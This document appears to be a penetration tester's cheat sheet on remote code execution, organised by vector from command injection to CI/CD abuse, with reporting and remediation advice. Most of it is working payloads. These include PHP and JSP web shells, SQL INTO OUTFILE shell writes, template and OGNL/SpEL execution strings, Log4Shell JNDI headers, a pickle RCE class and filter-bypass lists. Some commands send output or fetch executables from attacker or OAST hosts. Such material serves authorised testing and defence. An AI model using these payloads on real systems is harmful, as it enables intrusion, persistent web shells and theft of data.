# Remote Code Execution

The finding that ends most engagements, and the one that causes most of the
damage when handled carelessly. This sheet is organised by **where the execution
happens**, because that determines both how you find it and how you prove it.

One rule before anything else:

> **Prove minimally, then stop.** `<?php echo 'marker'; ?>` rendering is a
> complete proof of RCE. A reverse shell, a file read, and a data dump are
> consequences you do not need to demonstrate. Retrieve one marker, screenshot
> it, and stop.

---

## Contents

- [How to find an execution sink](#how-to-find-an-execution-sink)
- [Command injection](#command-injection)
- [Command execution through SQL](#command-execution-through-sql)
- [File upload to execution](#file-upload-to-execution)
- [Template injection to execution](#template-injection-to-execution)
- [Expression language injection](#expression-language-injection)
- [Deserialisation to execution](#deserialisation-to-execution)
- [XXE to execution](#xxe-to-execution)
- [SSRF to execution](#ssrf-to-execution)
- [Config and log poisoning](#config-and-log-poisoning)
- [Infrastructure and CI/CD](#infrastructure-and-cicd)
- [Verifying without breaking](#verifying-without-breaking)
- [Reporting an RCE](#reporting-an-rce)

---

## How to find an execution sink

RCE is nearly always one of three things: input reaching an interpreter, a file
you can write landing somewhere it is executed, or a deserialiser doing
something dangerous. Find which one you have before you try anything.

```bash
# In the browser, this is the most reliable method
# 1. DevTools, Network tab, filter by fetch/xhr
# 2. Every request that takes input: which parameter, and what does it do?
# 3. The Response tab. If your input is reflected, note the encoding
# 4. The Initiator tab. Which function built this? What else does it call?
```

```bash
# Source, which is faster than reading the UI
grep -rohE "https?://[a-zA-Z0-9._-]+" app.js | sort -u
grep -riE "exec|eval|system|popen|spawn|Runtime\.getRuntime|ProcessBuilder" app_unpacked/smali
```

**Sinks worth grepping for, by language:**

| Language | Dangerous sinks |
|---|---|
| PHP | `eval`, `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `assert`, `create_function`, `unserialize`, `include` with a variable |
| Python | `eval`, `exec`, `pickle.loads`, `os.system`, `subprocess.*(shell=True)`, `yaml.load` |
| Java / JSP | `Runtime.getRuntime().exec`, `ProcessBuilder`, `getScriptEngine`, `ScriptEngineManager`, `ObjectInputStream.readObject`, expression evaluators |
| .NET | `Process.Start`, `BinaryFormatter`, `XmlSerializer` with a dangerous type, `Assembly.Load` |
| Node | `child_process.exec`, `eval`, `vm.runInNewContext`, `require` with a user-controlled path, template engines with `eval` |
| Ruby | `eval`, `system`, `exec`, backticks, `Marshal.load` |
| Shell | `bash -c`, `sh -c`, `system()`, `popen()` with a variable |

---

## Command injection

The input reaches a shell. Usually in a ping, a converter, a file handler, or a
"report generator".

```bash
# Detection. Metacharacters are the giveaway.
# & | ; $ ( ) < > newline
curl -s "https://<target>/?host=127.0.0.1;id"
curl -s "https://<target>/?host=127.0.0.1|id"
curl -s "https://<target>/?host=127.0.0.1&&id"
curl -s "https://<target>/?host=127.0.0.1%0aid"      # newline separated
curl -s "https://<target>/?host=\$(id)"
curl -s "https://<target>/?host=\`id\`"
```

```bash
# Blind. Use time as the oracle.
curl -s -o /dev/null -w "%{time_total}\n" "https://<target>/?host=127.0.0.1;sleep+5"
# 5.0 seconds versus 0.0 is proof, and it proves nothing was displayed
```

```bash
# Out-of-band, when you cannot get output back
curl -s "https://<target>/?host=127.0.0.1|curl+https://<oast-id>.oast.live/?d=\$(id|base64)"
```

```bash
# Python, and the newline trick
import subprocess
subprocess.run(request.args['cmd'], shell=True)          # never
subprocess.run(request.args['cmd'].split())             # safer
```

```bash
# Windows targets
curl -s "https://<target>/?host=127.0.0.1&whoami"
curl -s "https://<target>/?host=127.0.0.1&ipconfig"
```

### Bypassing a filter on a metacharacter

```bash
# Blacklist matching a single string
;id                 -> ;i'd
;%09id              # tab
;$(id)
%0aid               # newline
||id
&&id
$(id)
{ id; }             # some filters miss this
# Windows
&whoami
&&whoami
|whoami
%26whoami           # encoded ampersand
```

```bash
# Tool, and always read its output rather than trusting the label
sqlmap -u "https://<target>/?id=1" --os-cmd=id --technique=T
# --os-cmd  is for a non-SQL injection command execution context
```

---

## Command execution through SQL

Worth knowing because a database server is often running with more privilege and
network access than the web application, so a SQL injection is often a pivot
rather than a finding in itself.

```sql
-- MySQL: write a file. Needs FILE privilege and a writable path.
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO DUMPFILE '/var/www/html/shell.php' --
```

```sql
-- MSSQL
EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

```sql
-- PostgreSQL: COPY to a program, for a superuser
COPY (SELECT '') TO PROGRAM 'id';
```

```bash
# MSSQL, with netexec, because it is easier than hand-writing the queries
netexec mssql <target> -u sa -p '<pass>' -q "EXEC xp_cmdshell 'whoami'"
netexec mssql <target> -u sa -p '<pass>' -x 'whoami'
netexec mssql <target> -u sa -p '<pass>' -q "EXEC xp_cmdshell 'certutil -urlcache -split -f http://<attacker-ip>:8000/p.exe C:\\Users\\Public\\p.exe'"
```

**Note on the MySQL `INTO OUTFILE` path.** It writes wherever the server process
can write, which may not be the web root. If the file lands somewhere you cannot
reach, that is still a serious finding, and you do not need to escalate to
prove it. Report the write primitive.

---

## File upload to execution

The question is never "did it upload". It is **does the server execute it**.

```bash
# A PHP upload. Content type and extension both matter, and differently
# per framework.
printf '<?php echo "RCE_CONFIRMED_".php_uname(); ?>' > proof.php
curl -s -F "file=@proof.php;type=image/jpeg" https://<target>/upload
curl -s -F "file=@proof.php;type=application/x-php" https://<target>/upload
curl -s -F "file=@proof.php;filename=proof.php5" https://<target>/upload
curl -s -F "file=@proof.php.jpg" https://<target>/upload
```

```bash
# Magic bytes, when the server trusts content over name
# A GIF header followed by PHP. Passes naive image checks.
printf 'GIF89a<?php echo "RCE_CONFIRMED"; ?>' > proof.php.gif
# A valid PNG header followed by PHP
printf '\x89PNG\r\n\x1a\n<?php echo "RCE_CONFIRMED"; ?>' > proof.php.png
```

```bash
# By stack
# PHP
proof.php  proof.phtml  proof.php3  proof.php4  proof.php5  proof.php7
proof.phar   # a PHAR is PHP, and often allowed where .php is not
proof.php::$DATA   # Windows NTFS alternate data stream

# Java
proof.jsp
# The classic JSP, if the file lands in a web-accessible directory
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```bash
# Finding where uploads land
curl -s "https://<target>/uploads/proof.php"
curl -s "https://<target>/upload/proof.php"
curl -s "https://<target>/images/proof.php"
curl -s "https://<target>/media/proof.php"
curl -s "https://<target>/static/uploads/proof.php"
curl -s "https://<target>/files/proof.php"
# Read the response of the upload request. The path is usually in it.
```

```bash
# Confirming execution rather than assuming it
curl -s "https://<target>/uploads/proof.php" | grep RCE_CONFIRMED
```

```bash
# Non-PHP stacks
# ASP.NET, when a .aspx is accepted
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd","/c whoami > C:\\Users\\Public\\out.txt").StandardOutput.ReadToEnd()); %>
# Check the output file
curl -s "https://<target>/Users/Public/out.txt"

# Node, where an upload lands somewhere require() will load
module.exports = require('child_process').execSync('id').toString();
# JSON/YAML/config files that the application deserialises and evaluates
```

```bash
# Tooling
# Burp or ZAP will craft the multipart request for you, which is faster
# than hand-writing boundaries
# Nikto and nuclei have upload checks worth a look, but confirm by hand
```

---

## Template injection to execution

A template engine evaluating your input means you have a code path to the
interpreter.

```bash
# Fingerprint first. A Jinja2 payload against Twig will not work.
{{7*7}}         ->  49    Jinja2, Twig, Nunjucks, Vue
{{7*'7'}}       ->  7777777   Jinja2, string form
${7*7}          ->  49    Freemarker, Velocity, Java EL
<%= 7*7 %>      ->  49    ERB, ASP
${{7*7}}        ->  49    Spring, Thymeleaf
${T(java.lang.Runtime).getRuntime().exec('id')}   # Spring SpEL
```

```bash
# Jinja2, Python
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

```bash
# Twig
{{ _self.env.registerUndefinedFilterCallback('system') }}
{{ _self.env.registerUndefinedFilterCallback('exec') }}
```

```bash
# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("id") }
# The classic, for older FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

```bash
# ERB, Ruby
<%= `id` %>
<%= system('id') %>
<%= %x(id) %>
```

```bash
# Velocity
# $class.inspect("java.lang.Runtime").getRuntime().exec("id")
# or through the tool, which is more reliable than hand-writing it
```

```bash
# Burp has SSTI templates for Jinja2, Twig, Freemarker, Velocity, ERB and
# Thymeleaf, selected from the right-click menu. Faster and more reliable
# than writing them by hand.
```

---

## Expression language injection

Older and distinct from templating. Common in Struts, Spring, and JSP.

```java
// Apache Struts / OGNL
${7*7}
%{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
${#a=@java.lang.Runtime@getRuntime().exec('id'),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=#c.readLine(),#e=#d}
#dict['7*7']                       # a 2021-era Struts bypass, worth knowing
```

```java
// Spring Expression Language
${T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'id'})}
#this.class.classLoader...   # older SpEL, for reference
```

```java
// JSP Expression Language
${Runtime.getRuntime().exec('id')}                  # rarely permitted directly
${pageContext.request.contextPath}
# The usual route is a tag library or a bean rather than EL directly,
# so look for a parameter that reaches a custom tag
```

```java
// FreeMarker covered above. Thymeleaf
${T(java.lang.Runtime).getRuntime().exec('id')}
```

```bash
# Log4Shell. Worth recognising instantly, because it changes the engagement.
# If the target runs a vulnerable Log4j, any user-controlled string that
# reaches a log is a remote trigger. The header is the classic vector.
curl -sI -H 'User-Agent: ${jndi:ldap://<oast-id>.oast.live/a}' https://<target>/ -o /dev/null
curl -s -H 'X-Api-Version: ${jndi:ldap://<oast-id>.oast.live/b}' https://<target>/api -o /dev/null
# A callback on your listener is proof. Do not go further without authorisation.
```

```bash
# Finding Log4Shell without a callback
curl -s -H 'User-Agent: ${jndi:ldap://x.y.z}' https://<target>/ -o /dev/null -w "%{http_code}\n"
# A 400 with an unusual body on a header that should be ignored is suggestive
```

---

## Deserialisation to execution

The most technically involved vector, and the one where reading the library
version saves hours.

```bash
# Identify the format from the payload itself
rO0AB...                   # base64, Java serialization
AC ED 00 05                # hex, Java serialization
O:8:"stdClass":1:{...}     # PHP serialize
K:1:"s":42:"..."           # PHP
gASV...                    # Python pickle, base64
__VIEWSTATE                # ASP.NET
```

```bash
# Java. The tool for the job, and you need the right gadget chain.
# yoserial is for JDK 6/7. ysoserial is a maintained fork with more coverage.
java -jar ysoserial-all.jar CommonsCollections1 'curl http://<attacker-ip>:8000/$(id|base64)'
java -jar ysoserial-all.jar URLDNS 'http://<oast-id>.oast.live/'
# URLDNS does not execute code. It makes a DNS lookup, which is how you
# PROVE the deserialiser is reachable before deciding whether to continue.
```

```bash
# PHP
# If you can only prove deserialisation, use an object that has an effect
# you can observe rather than one that executes.
phpggc -l            # list gadget chains
phpggc -s            # by software
phpggc <chain> -p '<payload>' | base64 -w0
```

```bash
# Python pickle
import base64, pickle, os
class RCE:
    def __reduce__(self): return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

```bash
# .NET, where the finding is usually BinaryFormatter
# Look for the pattern in source or traffic rather than guessing
ysoserial.exe -g ObjectDataProvider
```

```bash
# Finding the gadget chain: read the library versions
cat pom.xml | grep -A2 "<artifactId>"
grep -i "commons-collections\|commons-beanutils\|spring-core" pom.xml
grep -E "gadget|chain|ysoserial" -r .
```

**Verify with URLDNS or a DNS-beacon payload first.** A DNS callback proves the
deserialiser processes your input without executing anything, and that is usually
the evidence a client needs.

---

## XXE to execution

XML external entity processing, used to read files and, in older PHP setups, to
execute code.

```bash
# Prove the parser is vulnerable, out of band first
curl -s -X POST https://<target>/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<oast-id>.oast.live/">]><data>&xxe;</data>'
```

```bash
# Confirm local file read, in band
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

```bash
# PHP: expect:// and php:// wrappers, on older PHP with the wrappers allowed
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<data>&xxe;</data>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
<data>&xxe;</data>
```

```bash
# The "PHP filter chain" technique
# Uses php://filter chains of iconv conversions to synthesise arbitrary bytes,
# so you can write a PHP file without a file primitive. Published by synacktiv
# as "PHP filter chain RCE". Use a known-good published chain for the PHP
# version, because the offsets are version-specific.
# The technique matters here because it defeats apps that block file writes
# but still parse XML.
```

```bash
# Where XXE hides
SOAP endpoints
SAML assertions, which are frequently unauthenticated
DOCX, XLSX, SVG and other uploads. All are just XML containers.
RSS and Atom feeds
XML-RPC
SVG profile-picture uploads. The one people forget.
```

```bash
# Checking whether a parser is even reachable
# Does the endpoint accept XML at all?
curl -s -X POST https://<target>/api/xml -H "Content-Type: text/xml" -d '<x/>'
curl -s -X POST https://<target>/api/xml -H "Content-Type: application/xml" -d '<x/>'
# Content-type switching matters. Some apps parse XML only on the right one.
```

---

## SSRF to execution

Sometimes the server will not execute code for you, but it will make a network
request to something that will.

```bash
# Redis, writing an SSH key or a cron job. Classic.
gopher://127.0.0.1:6379/_SET%20ssh%20dir%20/root/.ssh%20...%0A
# the payload is URL-encoded Redis protocol, terminated with %0D%0A
```

```bash
# Memcached, which can be abused for cache poisoning
gopher://127.0.0.1:11211/_set%20key%20...%0D%0A
```

```bash
# Docker API, if it is reachable from the web host
gopher://127.0.0.1:2375/_POST%20/images/create%20HTTP/1.1%0D%0A...
curl -s -X POST "http://<target>/fetch" --data-urlencode "url=http://127.0.0.1:2375/containers/json"
```

```bash
# Cloud metadata, then use what you found
# See cloud-and-containers.md for the full metadata endpoints
```

---

## Config and log poisoning

No injection at all, just a writable file somewhere it matters.

```bash
# Log poisoning: a web shell in a log file the server will include
# 1. Send PHP in a header that gets logged
curl -s -H 'User-Agent: <?php system($_GET["c"]); ?>' https://<target>/index.php
# 2. Find the log
curl -s "https://<target>/var/log/apache2/access.log?c=id"          # Linux
curl -s "https://<target>/c:/inetpub/logs/log_file/access_log?c=id"  # Windows IIS
```

```bash
# Session file poisoning, same idea
# 1. Put PHP in a username or similar
# 2. Include the session file
curl -s "https://<target>/?page=/var/lib/php/sessions/sess_<id>"
```

```bash
# SSH authorised_keys
# If a file parameter lets you write into a home directory, and you know the key
curl -s -X PUT https://<target>/upload -d 'ssh-rsa AAAA... user@lab'
```

```bash
# Jenkins, Groovy, and other scriptable config
# A .groovy file in the Jenkins scripts directory is executed
```

```bash
# php.ini, .htaccess, and IIS web.config
# All of these change behaviour, and all are reachable via upload or traversal
AddType application/x-httpd-php .jpg      # .htaccess
# web.config, which will execute an aspx from a jpg-named upload
<configuration><system.webServer><handlers>
<add name="PHP_via_FastCGI" path="*.jpg" verb="*" resourceType="Unspecified" requireAccess="Script" />
</handlers></system.webServer></configuration>
```

---

## Infrastructure and CI/CD

```bash
# CI runners
# A runner executes whatever the repository says. If you can modify the
# repository, you have code execution on the runner.
# If the runner is self-hosted, it may be on the internal network.

# Jenkins
curl -s http://<jenkins>/scriptText --data-urlencode "script=println('id'.execute().text)"
curl -s http://<jenkins>/manage/credentials
# Groovy console, when unauthenticated or weakly authenticated, is direct RCE

# ArgoCD, which deploys from git
# Access to the git repository means deploying anything

# GitHub Actions, self-hosted runners
# A workflow you can push to runs on the runner

# Docker API
curl -s http://<host>:2375/containers/json
curl -s -X POST "http://<host>:2375/containers/create?name=proof" -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["id"]}'
curl -s -X POST "http://<host>:2375/containers/<id>/start"
```

```bash
# Package registries with deployment rights
# If you can publish, the next deploy runs your code
npm publish --access public
# Push to a deployment branch
git push origin main
```

---

## Verifying without breaking

The difference between a professional RCE report and an incident.

```bash
# Establish the execution context, nothing more
id
whoami
hostname
# These three are a complete finding. They prove execution and they prove
# the privilege level, which is the thing the client needs to prioritise.
```

```bash
# A write proof, if you must demonstrate persistence of the primitive
# Prefer a file you can delete afterwards
printf 'RCE_PROOF %s\n' "$(date)" > /tmp/pentest-proof.txt
# Then report the path, and remove it at the end of the engagement
```

```bash
# Avoid
# - Reading /etc/shadow, SAM, or NTDS. You do not need them to prove RCE.
# - A reverse shell. It gives you nothing the marker did not.
# - Pivoting. Prove you can, do not, unless that is the agreed objective.
# - Anything that changes state. No cron entries, no new users, no webshell
#   left behind.
```

```bash
# Clean up everything, and tell the client what you left running
# (nothing, ideally) and what you changed
ls -la /tmp/pentest-proof.txt && rm -f /tmp/pentest-proof.txt
```

```bash
# Note the detection footprint. Tell them, so their SOC is not surprised.
# A client who finds your proof command in their own logs before you report
# it has a bad first impression of the engagement.
```

---

## Reporting an RCE

Structure it the way an engineer who has to fix it would want to read.

**Include these seven things and nothing more:**

1. **One sentence.** "An unauthenticated parameter reaches a shell, giving any visitor remote code execution as the web service user."
2. **The exact request.** Raw, redacted where necessary, copy-pasteable.
3. **The exact response.** Including the marker.
4. **The privilege level.** `www-data` versus `root` changes the severity entirely.
5. **Every affected entry point.** A fix applied to one parameter leaves the others open. This is the most commonly missed part of an RCE report.
6. **The root cause.** Command injection in a version function, an upload landing in the web root, a deserialiser on untrusted data. Naming it means they fix the class, not the instance.
7. **The remediation**, which is in the reference below.

**What not to include.** A screenshot of a full interactive shell. A data dump.
A webshell URL still live on their server. Any real user data you passed
through. If you did retrieve any of those, redact it and say what you retrieved
and why, because that is a disclosure the client needs to make.

**Severity guidance.** Unauthenticated RCE as a low-privilege user is critical.
RCE as root, or RCE requiring a valid account, is often high rather than
critical, because the authentication barrier is real. RCE reachable only by an
administrator who could already run commands is usually medium, and reporting it
as critical is how you lose credibility for the rest of your findings.

---

## Remediation reference

| Vector | Fix |
|---|---|
| Command injection | Never build a shell string. Use an argument array: `subprocess.run(['ping', host], shell=False)`. Validate the input against an allowlist. |
| SQL to command | Remove `xp_cmdshell`, run the database as a restricted user, and do not let the web user write files |
| Upload to execution | Store uploads outside the web root, serve them from a separate host or with `Content-Disposition: attachment`, and never execute them. Generate the filename; never use the client's |
| Template injection | Never render user input as a template. Use a logic-less engine. |
| Expression language | Do not evaluate user-controlled expressions. Disable OGNL and SpEL evaluation of untrusted input |
| Deserialisation | Do not deserialise untrusted data. Use JSON. If you must, use a strict allowlist or HMAC-sign the payload |
| XXE | Disable DTD processing entirely. `setFeature` for `disallow-doctype-decl` on Java, `LIBXML_NOENT` off on PHP, or an `XMLParser` with entity resolution disabled |
| SSRF | Allowlist destinations. Resolve the hostname and check the IP before connecting, and re-check after redirects |
| Log and session poisoning | Keep logs and session files outside any path the application can include. Set a restrictive umask |
| CI/CD | Do not expose runners. Scope tokens. Require review on workflow changes. Never run untrusted PRs on a self-hosted runner |

Include this table in the report where it applies. An engineer who has to work
out the fix themselves will fix it badly or not at all.
